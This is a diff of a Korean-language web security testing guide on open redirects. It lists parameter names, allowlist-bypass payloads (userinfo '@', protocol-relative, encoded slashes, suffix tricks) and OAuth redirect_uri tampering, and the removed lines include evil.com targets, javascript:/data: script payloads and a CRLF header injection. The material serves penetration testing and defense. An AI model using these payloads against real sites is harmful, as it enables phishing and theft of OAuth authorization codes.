@@ -1,294 +1,304 @@
 ---
-sidebar_position: 22
+sidebar_position: 26
 title: Open Redirect
-description: 웹 진단 - Open Redirect 점검 절차, URL 검증 우회 패턴 (스킴/@/부분매칭/인코딩), OAuth redirect_uri 우회, 판정 기준
+description: 웹 진단 - Open Redirect 탐지, URL 파싱·allowlist 우회, 로그인 후 이동, OAuth redirect_uri 점검 절차와 판정 기준
 keywords: [Open Redirect, URL Redirection, Unvalidated Redirect, Phishing, OAuth, redirect_uri, SSO, Token Theft, OWASP A01]
 draft: false
+toc_max_heading_level: 3
 ---
 
-# 오픈 리다이렉트
-> 서버가 사용자 입력 URL 을 그대로 따라가 **외부 도메인으로 리다이렉트** 되는 결함.
-> 단독으로는 피싱 신뢰도 향상이지만, **OAuth / SSO 의 `redirect_uri` 검증 미흡과 결합되면 인증 코드 / 액세스 토큰 탈취** 까지 직결.
-
-## 점검 개요
-
-| 항목 | 내용 |
-| :--- | :--- |
-| **분류** | OWASP A01:2025 - Broken Access Control (URL 검증 카테고리) / KISA URL 접근 제어 |
-| **CWE** | [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html) |
-| **영향도** | 🟡 (피싱 단독) / 🔴 (OAuth `redirect_uri` 우회 → 토큰 탈취) |
-| **점검 난이도** | 하 (1차 탐지) / 중 (화이트리스트 검증 우회) |
-| **예상 점검 시간** | 30분 ~ 2시간 |
-
----
+> 신뢰할 수 있는 서비스 주소를 열었는데 사용자 입력에 따라 전혀 다른 외부 사이트로 이동할 수 있는지 확인한다.
 
 ## 점검 목적
 
-redirect 대상 URL 이 사용자 입력으로부터 결정되는 흐름을 식별하고, **외부 도메인으로 임의 이동이 가능한지** 확인한다. 단독 결함으로는 피싱 페이지의 진짜 도메인 클로킹 (피해자가 진짜 도메인을 클릭) 정도의 임팩트지만, **OAuth/SSO 환경에서 `redirect_uri` 가 부분 매칭으로 검증되면 인증 코드가 공격자 서버로 전달되어 계정 탈취** 까지 가능.
+로그인 전후 이동, 외부 연동, 공유 링크처럼 redirect 목적지가 요청값으로 결정되는 흐름을 찾는다. 입력값이 서버의 `Location` Header, HTML meta refresh, JavaScript 이동 코드에 들어갈 때 실제 브라우저가 허용되지 않은 외부 host로 이동하는지 확인한다.
 
-> **다른 페이지와 영역 분리**
-> - HTTP Response Splitting / CRLF Injection (`%0d%0aLocation:`) → 본 페이지에서는 한 줄 언급, 별도 영역
-> - 클라이언트 측 `location.href = userInput`, `<meta http-equiv="refresh">` 의 JS 변조 → `xss.md` (DOM XSS) 와 일부 겹침
-> - SSRF (서버가 직접 `userInput` URL 로 요청 보내는 경우) → `ssrf.md`
+단독 영향은 주로 신뢰받는 도메인을 이용한 링크 위장이다. OAuth·SSO, 비밀번호 재설정, 서버 측 URL 요청과 연결되면 인증 코드나 민감한 값이 전달되는지 별도로 확인한다. 서버가 URL을 직접 요청하면 [SSRF](./ssrf.md), Header 줄바꿈이 가능하면 HTTP Response Splitting 범위로 분리한다.
 
 ---
 
 ## 유형 구분
 
-| 유형 | 핵심 |
-| :--- | :--- |
-| **단순 GET/POST 파라미터 리다이렉트** | `?returnTo=`, `?url=`, `?next=`, `?redirect=`, `?dest=`, `?callback=` |
-| **로그인 / 로그아웃 후 redirect** | 가장 흔한 진입점 — `next` 파라미터 |
-| **OAuth / SSO `redirect_uri` 검증 미흡** | 임팩트 최상위. 인증 코드 / 토큰 탈취 |
-| **HTML meta refresh / JS 리다이렉트** | 일부는 클라이언트 영역, DOM XSS 와 겹침 |
+| 유형 | 특징 | 실무 판단 |
+| :--- | :--- | :--- |
+| **서버 응답 이동** | `3xx Location` 값이 사용자 입력으로 결정됨 | 브라우저가 허용되지 않은 외부 host로 이동하면 취약 |
+| **로그인 후 이동** | `next`, `returnTo` 값으로 로그인·로그아웃 뒤 이동함 | 외부 목적지가 허용되면 취약 |
+| **브라우저 코드 이동** | meta refresh나 JavaScript가 입력 URL을 사용함 | 최종 주소가 외부 host이면 client-side open redirect |
+| **연동 콜백 이동** | OAuth·SSO·결제 callback 주소를 요청에서 받음 | 등록된 목적지 밖으로 코드·값이 전달되면 영향 상승 |
 
 ---
 
 ## 진단 절차
 
-### Step 1. 진입점 식별
+#### Step 1. 진입점 식별
 
-Burp 시퀀스에서 redirect 흐름을 모두 수집. 흔한 파라미터 이름:
+Burp에서 `3xx` 응답과 이동 관련 파라미터를 찾는다.
 
-```
+```text
 ?returnTo=    ?return=     ?next=        ?redirect=    ?redirect_uri=
 ?url=         ?dest=       ?destination= ?continue=    ?callback=
 ?goto=        ?target=     ?rurl=        ?forward=     ?path=
 ```
 
-응답 형태 우선순위:
+다음 흐름을 우선 확인한다.
 
-- **3xx + `Location` 헤더** — 서버 측 리다이렉트 (가장 흔함, 본 페이지 주 대상)
-- **`<meta http-equiv="refresh" content="0; url=...">`** — HTML 본문 리다이렉트
-- **`<script>location.href = "..."</script>`** — JS 리다이렉트 (DOM 영역 결합 가능)
+- 로그인·로그아웃·가입 완료 후 원래 페이지로 돌아가기
+- 비밀번호 재설정·이메일 인증 완료 후 이동
+- 외부 결제·본인인증·SSO 연동
+- 링크 추적·다운로드·광고·파트너 이동
+- OAuth 요청의 `redirect_uri`
 
-특히 우선 점검 흐름:
+#### Step 2. 정상 이동 기준선 저장
 
-- 로그인 / 로그아웃 / 회원가입 / 비밀번호 재설정 후 `next` 또는 `returnTo` 리다이렉트
-- OAuth / SSO 콜백 흐름 (`/oauth/authorize?...&redirect_uri=...`)
-- 결제 PG 콜백, 외부 인증 (네이버/카카오/구글) 흐름
-
-### Step 2. 기본 탐지
-
-가장 단순한 외부 도메인 페이로드:
+내부 경로로 정상 이동하는 요청과 응답을 저장한다.
 
 ```http
-GET /login?returnTo=https://evil.com HTTP/1.1
-Host: <TARGET>
+GET /login?next=/account HTTP/1.1
+Host: target.example
 ```
 
-응답 헤더의 `Location` 또는 본문의 `meta refresh` 가 `evil.com` 으로 향하면 1차 확정.
+응답의 `Location`, meta refresh, JavaScript 변수 중 어느 값이 실제 이동을 결정하는지 확인한다.
 
-### Step 3. 검증 우회 시도
+#### Step 3. 소유한 외부 주소로 교체
 
-기본 페이로드가 차단되면 케이스 2~5 의 우회 패턴을 순차 적용.
+테스트용으로 직접 통제하고 로그를 확인할 수 있는 host를 사용한다.
 
-### Step 4. 영향 입증
+```http
+GET /login?next=https://<CONTROLLED_HOST>/redirect-check HTTP/1.1
+Host: target.example
+```
 
-- **피싱 시나리오**: 공격자가 호스팅한 가짜 로그인 페이지로 자동 이동
-- **OAuth 토큰 탈취 시나리오**: `redirect_uri` 우회로 인증 코드가 공격자 서버로 전달되어 액세스 토큰 발급까지 입증
+`Location` Header만 보지 말고 브라우저로 열어 최종 주소창의 scheme·host·port를 확인한다. 중간 경고 페이지에서 사용자가 다시 눌러야 하는 경우도 구분한다.
+
+#### Step 4. URL 해석 차이 확인
+
+기본 외부 URL이 차단되면 한 요소씩 바꾼다.
+
+1. `https://`와 `//` 비교
+2. 허용 host 앞뒤의 `@`, 점, 하위 도메인 비교
+3. URL 인코딩과 이중 디코딩 비교
+4. 백슬래시·제어문자 정규화 비교
+5. 내부 redirect endpoint를 거치는 연쇄 이동 확인
+
+서버가 허용한 문자열이 아니라 브라우저가 최종적으로 해석한 `hostname`을 기준으로 판정한다.
+
+#### Step 5. 연결되는 보안 흐름 확인
+
+- 로그인·재설정 링크에서 외부 이동이 가능한지
+- OAuth 등록 callback 내부에 open redirect가 있는지
+- 인증 코드·토큰·민감한 query 또는 fragment가 외부로 전달되는지
+- Authorization Code Flow에서 PKCE, client 인증, redirect URI 결합이 추가로 적용되는지
+- 서버 측 HTTP client가 redirect를 따라가 SSRF로 이어지는지
+
+인증 코드가 외부에 도착했다는 사실과 실제 토큰 교환 가능성을 분리한다.
+
+### 상황별 빠른 선택
+
+| 현재 상황 | 먼저 할 테스트 |
+| :--- | :--- |
+| `next=/account` 같은 내부 경로 | `https://<CONTROLLED_HOST>/`와 `//<CONTROLLED_HOST>/` |
+| 허용 도메인으로 시작해야 함 | `https://allowed.example@<CONTROLLED_HOST>/` |
+| 허용 도메인을 포함하면 통과 | `https://<CONTROLLED_HOST>/?allowed.example` |
+| URL 인코딩 후 이동 | `%2f%2f<CONTROLLED_HOST>`과 이중 인코딩 |
+| meta refresh·JavaScript 이동 | 브라우저 주소창의 최종 host 확인 |
+| OAuth `redirect_uri` | 등록 URI 변형과 등록 callback 내부 redirect 확인 |
 
 ---
 
-## 페이로드 / 테스트 케이스
+## 페이로드 노트
 
-### 케이스 1: 기본 외부 도메인
+### 1. 기본 외부 주소
 
-**언제 쓰는지**: Step 2 의 첫 페이로드. 검증이 아예 없는 경우 즉시 확정.
+**이럴 때 사용**: 이동 목적지가 `next`, `url`, `returnTo` 같은 요청값으로 전달된다.
 
-```
-?returnTo=https://evil.com
-?returnTo=http://evil.com
-?returnTo=//evil.com
-```
+**바꿀 값**
 
-**판정**: 응답 `Location:` 헤더가 `https://evil.com` (또는 `//evil.com`) 으로 그대로 나가면 취약. 단, 응답이 `Location: /error` 같은 정적 페이지면 검증이 동작한 것 — 케이스 2~5 로 우회 시도.
-
-### 케이스 2: 스킴 / 슬래시 우회
-
-**언제 쓰는지**: 기본 페이로드가 차단됐고, 검증 로직이 `http://` / `https://` 같은 스킴 prefix 만 확인할 가능성이 있을 때.
-
-```
-//evil.com               ← protocol-relative URL. 스킴 검증 우회의 가장 흔한 케이스
-/\evil.com               ← 슬래시-백슬래시 혼합 (브라우저는 // 로 해석)
-\\evil.com               ← Windows 경로처럼 보이지만 브라우저는 // 처리
-\/\/evil.com             ← 인코딩 변형
-https:evil.com           ← 슬래시 누락 (일부 파서는 호스트로 해석)
-https://%00evil.com      ← null byte 삽입
-javascript:alert(document.domain)   ← 모던 브라우저는 Location 헤더에서 차단되지만 meta refresh / a href 에서는 가능
-data:text/html,<script>alert(1)</script>
+```text
+?returnTo=https://<CONTROLLED_HOST>/redirect-check
+?returnTo=http://<CONTROLLED_HOST>/redirect-check
+?returnTo=//<CONTROLLED_HOST>/redirect-check
 ```
 
-**판정**: 응답 `Location:` 에 위 페이로드가 그대로 들어가고, 브라우저에서 실제로 `evil.com` 으로 이동하면 취약. `javascript:` / `data:` 는 모던 Chrome/Firefox 가 `Location` 헤더에서 차단하므로 → meta refresh / JS 리다이렉트 흐름에서만 의미 있음.
+**확인할 것**: 브라우저가 통제 host로 실제 이동하고 접근 로그에 요청이 남는지 확인한다. `/error`, 내부 기본 페이지, 외부 이동 확인 화면으로 바뀌면 각각 다른 결과로 기록한다.
 
-### 케이스 3: `@` 트릭
-**언제 쓰는지**: 검증 로직이 `startsWith("https://target.com")` 같은 prefix 매칭일 때. URL 의 `userinfo@host` 문법을 이용.
+### 2. scheme과 슬래시 해석
 
-```
-https://target.com@evil.com
-https://target.com.@evil.com
-https://target.com%2F@evil.com           ← / 인코딩
-https://target.com%252F@evil.com         ← 이중 인코딩
-//target.com@evil.com
-```
+**이럴 때 사용**: 완전한 `https://<CONTROLLED_HOST>`는 차단되지만 내부 경로나 `https` 문자열만 검사하는 것으로 보인다.
 
-**판정**: 브라우저는 `evil.com` 으로 이동 (userinfo 부분 무시), 서버 검증은 `target.com` 으로 시작한다고 보고 통과. 응답 `Location:` 이 위 페이로드 그대로 나가고 브라우저에서 `evil.com` 으로 이동하면 취약.
+**바꿀 값**
 
-### 케이스 4: 화이트리스트 부분 매칭 우회
-
-**언제 쓰는지**: 검증 로직이 `startsWith` / `contains` / `endsWith` 같은 문자열 비교에 의존할 때. 호스트 정확 추출 후 비교가 아니면 거의 다 우회 가능.
-
-**4-1. `startsWith` 우회 (서브도메인 트릭):**
-
-```
-https://target.com.evil.com               ← 서브도메인처럼 보이지만 호스트는 evil.com
-https://target.com.evil.com/callback
+```text
+//<CONTROLLED_HOST>/redirect-check
+/\<CONTROLLED_HOST>/redirect-check
+\\<CONTROLLED_HOST>/redirect-check
+%2f%2f<CONTROLLED_HOST>/redirect-check
+%5c%5c<CONTROLLED_HOST>/redirect-check
 ```
 
-**4-2. `contains` 우회 (경로/쿼리/프래그먼트 포함):**
+**확인할 것**: 서버가 반환한 문자열과 브라우저 주소창의 최종 host를 함께 기록한다. 백슬래시와 인코딩은 서버·프레임워크·브라우저에 따라 해석이 달라 실제 이동 결과가 필요하다.
 
-```
-https://evil.com/target.com
-https://evil.com/?target.com
-https://evil.com#target.com
-https://evil.com?next=target.com
-```
+`javascript:`·`data:`는 외부 redirect 확인값과 목적이 다르다. 링크·meta refresh·JavaScript sink에서 실행되면 URL scheme 검증 또는 XSS 관점으로 별도 판정한다.
 
-**4-3. `endsWith` 우회 (suffix 매칭):**
+### 3. `@` 앞부분을 host로 오인하는지 확인
 
-```
-https://eviltarget.com                    ← 끝이 'target.com' 처럼 보임
-https://attacker-target.com
-```
+**이럴 때 사용**: 입력값이 `https://allowed.example`로 시작하는지만 검사하는 것으로 보인다. URL에서 `@` 앞은 사용자 정보이고 실제 host는 뒤쪽이다.
 
-**4-4. 디렉토리 traversal 결합:**
+**바꿀 값**
 
-```
-https://target.com/redirect?url=/..%2f..%2f@evil.com
-https://target.com/../../@evil.com
+```text
+https://allowed.example@<CONTROLLED_HOST>/redirect-check
+https://allowed.example:password@<CONTROLLED_HOST>/redirect-check
+//allowed.example@<CONTROLLED_HOST>/redirect-check
 ```
 
-**판정**: 위 변형 중 하나로 응답 `Location:` 이 통과되고 브라우저가 `evil.com` 으로 이동하면 취약. **`startsWith` / `contains` 검증 패턴은 거의 100% 우회 가능** 이므로, 발견 즉시 검증 로직 자체를 결함으로 보고.
+**확인할 것**: 최종 `hostname`이 통제 host인지 확인한다. 응답에 문자열이 반영됐지만 URL 파서가 거부하거나 내부 host에 머물면 취약 확정이 아니다.
 
-### 케이스 5: 인코딩 / 유니코드 우회
+### 4. 허용 host 문자열 비교
 
-**언제 쓰는지**: 단순 문자열 필터링 (`if 'evil.com' in url`) 만 적용된 경우. URL 디코딩 시점과 검증 시점의 불일치 (parser differential) 노림.
+**이럴 때 사용**: 허용 host 문자열이 URL의 시작·중간·끝에 있으면 통과하는 것으로 보인다.
 
-**5-1. URL 인코딩:**
+**바꿀 값**
 
-```
-%2F%2Fevil.com                  ← // 인코딩
-%2f%2fevil.com
-%252F%252Fevil.com              ← 이중 인코딩
-%5c%5cevil.com                  ← \\ 인코딩
-```
-
-**5-2. 백슬래시 / 공백:**
-
-```
-https:\\evil.com
-https:/\evil.com
-https://%09evil.com             ← 탭 문자
-https://%20evil.com
+```text
+https://allowed.example.<CONTROLLED_HOST>/
+https://<CONTROLLED_HOST>/allowed.example
+https://<CONTROLLED_HOST>/?next=allowed.example
+https://<CONTROLLED_HOST>/#allowed.example
+https://notallowed.example/
 ```
 
-**5-3. IDN / Punycode 동음이의:**
+마지막 값은 허용 host가 `allowed.example`일 때 단순 suffix 비교가 `notallowed.example`까지 허용하는지 확인하는 예시다.
 
-```
-https://xn--tre-9la.com         ← Punycode (다른 도메인)
-https://tаrget.com              ← 키릴 'а' (U+0430), 보기에는 target.com 과 동일
-https://target.com.evil.com (실제로 등록된 IDN 도메인 사용)
-```
+**확인할 것**: 문자열이 아니라 파싱된 `hostname`이 정확히 허용됐는지 확인한다. `host === allowed.example` 또는 의도한 하위 도메인만 `host.endsWith('.allowed.example')`로 검사하는 구현은 단순 suffix 검사와 다르다.
 
-**판정**: 위 변형 중 하나가 통과되면 디코딩 / 정규화 처리가 누락된 것. IDN 동음이의는 도메인을 실제 등록해야 입증 가능하지만, 페이로드가 통과되는 것만으로도 결함 보고 가능.
+### 5. 인코딩과 중복 디코딩
 
-### 케이스 6: OAuth `redirect_uri` 검증 우회
-**언제 쓰는지**: OAuth 2.0 Authorization Code Flow 에서 클라이언트(서비스) 가 `redirect_uri` 를 IdP 로 전달하는 단계. 사전 등록 URI 와의 매칭 검증이 부분 매칭이면 인증 코드 탈취 가능.
+**이럴 때 사용**: 입력값을 한 번 디코딩하면 차단되지만 redirect 직전에 다시 디코딩되거나 정규화되는 것으로 보인다.
 
-**전제 — 정상 흐름:**
+**바꿀 값**
 
-```
-1. 사용자가 로그인 버튼 클릭
-   GET /oauth/authorize?
-       client_id=app123&
-       redirect_uri=https://app.target.com/callback&
-       response_type=code&
-       state=xyz
-       → IdP 가 사용자 인증 후 위 redirect_uri 로 code 전달
-
-2. https://app.target.com/callback?code=AUTH_CODE&state=xyz
-
-3. 백엔드가 code 를 access_token 으로 교환
+```text
+%2f%2f<CONTROLLED_HOST>/redirect-check
+%252f%252f<CONTROLLED_HOST>/redirect-check
+%5c%5c<CONTROLLED_HOST>/redirect-check
+https%3a%2f%2f<CONTROLLED_HOST>%2fredirect-check
 ```
 
-**공격 페이로드 — `redirect_uri` 변조:**
+**확인할 것**: 요청 수신, 애플리케이션 검증, `Location` 생성, 브라우저 이동 중 어느 단계에서 몇 번 디코딩됐는지 비교한다. 최종 외부 이동이 없으면 인코딩 문자열이 통과했다는 사실만으로 취약 판정하지 않는다.
 
-```
-?redirect_uri=https://app.target.com.evil.com/callback
-?redirect_uri=https://app.target.com@evil.com/callback
-?redirect_uri=https://evil.com/?x=https://app.target.com/callback
-?redirect_uri=https://app.target.com/callback/../../@evil.com
-?redirect_uri=https://app.target.com.evil.com/callback#@app.target.com
-```
+IDN·Punycode 동음이의 도메인은 사용자를 속이는 문제와 관련 있지만, allowlist 우회는 실제 URL parser가 만든 ASCII `hostname` 비교가 잘못됐을 때만 성립한다. 외형이 비슷하다는 이유만으로 open redirect 우회로 보지 않는다.
 
-**공격 시나리오:**
+### 6. OAuth `redirect_uri`
 
-```
-1. 공격자가 위 변조된 redirect_uri 가 포함된 OAuth 시작 링크 작성:
-   https://idp.example.com/oauth/authorize?
-     client_id=app123&
-     redirect_uri=https://app.target.com.evil.com/callback&
-     response_type=code&
-     state=xyz
+**이럴 때 사용**: OAuth·OIDC 로그인 요청에 `client_id`와 `redirect_uri`가 포함된다.
 
-2. 피해자가 해당 링크 클릭 → IdP 에서 정상 로그인
-   (IdP 가 redirect_uri 부분 매칭만 검증하면 통과)
+**바꿀 값**: 정상 등록 callback을 기준으로 한 요소씩 변경한다.
 
-3. IdP 가 인증 코드를 공격자 도메인으로 전달:
-   https://app.target.com.evil.com/callback?code=AUTH_CODE&state=xyz
+```text
+정상: https://app.target.example/callback
 
-4. 공격자가 code 를 받아 즉시 토큰 엔드포인트로 교환
-   → 피해자 계정 액세스 토큰 획득 → 계정 완전 탈취
+https://app.target.example/callback/extra
+https://app.target.example/callback?next=https://<CONTROLLED_HOST>/
+https://app.target.example@<CONTROLLED_HOST>/callback
+https://app.target.example.<CONTROLLED_HOST>/callback
+https://<CONTROLLED_HOST>/?next=https://app.target.example/callback
 ```
 
-**판정**: IdP 가 변조된 `redirect_uri` 를 통과시키면 (= 사용자가 인증 후 공격자 도메인으로 code 가 전달되면) 즉시 Critical. 사전 등록 URI 와 완전 일치 검증이 아닌 모든 케이스가 결함.
+Authorization Server는 사전 등록된 redirect URI와 정확한 문자열 비교를 해야 한다. 네이티브 앱의 localhost callback port는 예외적으로 달라질 수 있다.
 
-> RFC 6749 §3.1.2.3 은 `redirect_uri` 의 **완전 일치** 매칭을 권고. 와일드카드 / prefix / suffix 매칭은 OAuth 보안 모범사례 위반.
+**확인할 것**
 
-### 그 외 — 한 줄 언급만
-- **CRLF Injection 결합** — `%0d%0aLocation: https://evil.com` 으로 Location 헤더 직접 주입. 모던 웹 서버는 거의 차단. `security-headers.md` 영역
-- **POST 폼 자동 제출 + open redirect** — CSRF + open redirect 체인. 단독 결함은 아님
-- **HTML meta refresh / `location.href = userInput`** — DOM 측면, `xss.md` 와 겹침
-- **SSRF 와의 결합** — 서버가 redirect 를 따라가서 내부 요청 발생 시 `ssrf.md` 영역
+1. 변조 URI가 인증 시작 단계에서 거부되는지
+2. 테스트 계정 인증 후 code·token이 어느 주소로 전달되는지
+3. 등록된 client callback 자체에 외부 redirect가 있는지
+4. Authorization Code Flow에서 PKCE·client 인증·redirect URI 결합이 적용되는지
+
+code가 통제 host에 도착하면 유출 경로는 확인된 것이다. 그러나 그것만으로 계정 탈취를 확정하지 않는다. 테스트 계정의 code를 실제로 교환하려면 PKCE verifier, client 인증, code와 redirect URI의 결합 조건까지 충족되는지 확인한다.
+
+### 7. 허용된 내부 redirect 연쇄
+
+**이럴 때 사용**: 외부 URL은 차단하지만 허용된 callback이나 내부 페이지에 별도 open redirect가 있다.
+
+```text
+https://app.target.example/redirect?next=https://<CONTROLLED_HOST>/
+```
+
+OAuth, SSO, URL allowlist가 위 내부 주소까지는 허용하고 이후 redirect를 따라가는지 확인한다. 원래 요청의 query나 fragment가 외부 목적지에 다시 붙는지도 브라우저에서 확인한다.
+
+**확인할 것**: 첫 redirect와 최종 redirect를 모두 기록한다. 내부 endpoint가 단독으로 외부 이동하는지, 보안 흐름의 code·token·민감한 값까지 함께 전달되는지를 분리한다.
+
+### 8. 브라우저 코드와 다른 취약점 경계
+
+- meta refresh·`location.href`가 외부 host로 이동하면 client-side open redirect로 판정한다.
+- `javascript:`·`data:` scheme이 실행되면 URL scheme 검증 또는 XSS 가능성을 별도로 확인한다.
+- 서버가 redirect를 따라 외부·내부 URL을 요청하면 [SSRF](./ssrf.md)에서 이어간다.
+- `%0d%0a`로 새 Header를 삽입할 수 있으면 HTTP Response Splitting으로 분리한다.
+
+---
+
+## 우회 매트릭스
+
+| 관찰 | 다음 확인 |
+| :--- | :--- |
+| 완전한 외부 URL은 차단 | `//host`, 인코딩된 슬래시, 백슬래시 해석 |
+| 허용 URL로 시작해야 함 | `allowed.example@controlled-host`의 최종 hostname |
+| 허용 문자열을 포함하면 통과 | 통제 host의 path·query·fragment에 허용 문자열 배치 |
+| 허용 도메인 suffix를 확인 | `notallowed.example`과 실제 하위 도메인 경계 비교 |
+| 한 번 인코딩하면 차단 | 이중 인코딩과 redirect 직전 디코딩 횟수 |
+| `Location`은 외부인데 이동하지 않음 | 브라우저 파싱 오류·경고 페이지·후속 JavaScript 확인 |
+| 내부 경로만 허용 | `//host`와 허용된 내부 open redirect 연쇄 |
+| 서버 redirect는 안전 | meta refresh·JavaScript가 같은 입력을 다시 사용하는지 |
+| OAuth 외부 URI는 거부 | 등록 callback의 path·query 허용 범위와 내부 redirect |
+| OAuth code가 외부에 도착 | PKCE·client 인증·redirect URI 결합 후 교환 가능성 |
+| query는 전달되지 않음 | fragment가 후속 redirect에 다시 붙는지 브라우저 확인 |
 
 ---
 
 ## 취약 판정 기준
 
-다음 중 **하나라도** 해당하면 취약:
+### 취약
 
-- [ ] redirect 파라미터에 **임의 외부 도메인** 그대로 통과 (`Location:` 헤더가 외부로 향함)
-- [ ] 스킴 / `@` / 슬래시 / 인코딩 트릭으로 화이트리스트 우회
-- [ ] `startsWith` / `contains` / `endsWith` 같은 **부분 매칭 검증** 으로 우회 가능 (검증 로직 자체가 결함)
-- [ ] **OAuth `redirect_uri`** 가 사전 등록 URI 와 완전 일치가 아닌 부분 매칭으로 검증
-- [ ] meta refresh / JS 리다이렉트가 사용자 입력 URL 로 동작
+- [ ] 사용자 입력으로 브라우저를 허용되지 않은 외부 host로 이동시킬 수 있음
+- [ ] `@`, protocol-relative URL, 인코딩·정규화 차이로 allowlist를 우회할 수 있음
+- [ ] 로그인·로그아웃·재설정 흐름 이후 외부 host로 자동 이동함
+- [ ] meta refresh·JavaScript가 사용자 입력을 사용해 외부 host로 이동함
+- [ ] OAuth Authorization Server가 등록되지 않은 redirect URI로 code·token을 전달함
+- [ ] 허용된 callback 내부의 open redirect를 통해 code·token이 외부로 이어짐
 
-**오탐 주의:**
+### 후보 / 보류
 
-- [ ] 응답이 외부 도메인으로 향해도 의도된 동작 (외부 결제 PG, SSO IdP, 위탁사 연계) 일 수 있음 — **점검 전 정책 확인 필요**
-- [ ] `Location:` 헤더가 외부 URL 이어도 실제로 브라우저가 그 URL 로 이동하는지 확인 (서버가 안내 페이지로 돌리는 경우도 있음)
-- [ ] OAuth `redirect_uri` 변조 시 IdP 가 거부하면 (`invalid_redirect_uri`) 정상 동작 — 취약 아님
-- [ ] `javascript:` / `data:` 페이로드는 모던 브라우저가 `Location` 헤더에서 차단 — 1차 평가 시점에서 실제 브라우저 동작도 확인
+- [ ] 외부 URL이 `Location`에 반영되지만 브라우저의 최종 외부 이동은 확인되지 않음
+- [ ] 외부 이동 전에 목적지가 명확히 표시되고 사용자의 추가 확인이 필요함
+- [ ] 정책상 허용된 결제·SSO·파트너 host로만 이동함
+- [ ] 인코딩 문자열은 통과하지만 최종 URL은 내부 host로 정규화됨
+- [ ] OAuth 변조 URI가 `invalid_redirect_uri`로 거부됨
+- [ ] OAuth code는 외부에 도착했지만 PKCE·client 인증 때문에 교환 가능성은 확인되지 않음
+
+### 영향 상승 조건
+
+- [ ] 로그인·재설정·보안 알림처럼 사용자가 신뢰하기 쉬운 링크에서 발생함
+- [ ] 외부 이동 주소에 이메일·토큰·인증 코드 등 민감한 값이 포함됨
+- [ ] OAuth 테스트 계정의 code를 필요한 검증값과 함께 실제 토큰으로 교환할 수 있음
+- [ ] SSRF allowlist나 다른 URL 기반 보안 검사를 우회하는 연쇄에 사용됨
+
+의도된 외부 연동은 허용 대상과 사용자 안내 방식을 확인한다. `Location` 문자열, 서버 응답 코드, 최종 브라우저 주소를 함께 남겨야 파서 차이로 인한 오판을 줄일 수 있다.
 
 ---
 
 ## 참고자료
 
+### 공식 및 테스트 가이드
+
 - [OWASP Cheat Sheet - Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
+- [OWASP - Open Redirect](https://owasp.org/www-community/attacks/open_redirect)
 - [PortSwigger - Open redirection](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
 - [PortSwigger - OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
-- [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
-- [HackTricks - Open Redirect](https://book.hacktricks.xyz/pentesting-web/open-redirect)
-- [RFC 6749 §3.1.2 - Redirection Endpoint](https://datatracker.ietf.org/doc/html/rfc6749#section-3.1.2)
+- [PortSwigger - URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
+- [MDN - URL API](https://developer.mozilla.org/docs/Web/API/URL)
 - [RFC 8252 - OAuth 2.0 for Native Apps](https://datatracker.ietf.org/doc/html/rfc8252)
 - [OAuth 2.0 Security Best Current Practice (RFC 9700)](https://datatracker.ietf.org/doc/html/rfc9700)
+
+### 커뮤니티 참고 / 도구
+
+- [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
+- [HackTricks - Open Redirect](https://hacktricks.wiki/en/pentesting-web/open-redirect.html)
